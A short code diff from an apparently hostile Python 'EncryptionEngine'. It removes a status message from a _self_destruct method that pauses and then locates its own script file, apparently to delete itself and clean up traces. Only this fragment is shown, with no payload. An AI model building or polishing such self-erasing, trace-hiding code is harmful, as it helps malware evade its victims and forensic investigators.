@@ -103,7 +103,6 @@ class EncryptionEngine:
         self._self_destruct()
 
     def _self_destruct(self):
-        print("[*] Cleaning up traces...")
         time.sleep(2)
         try:
             script_path = Path(__file__).resolve()
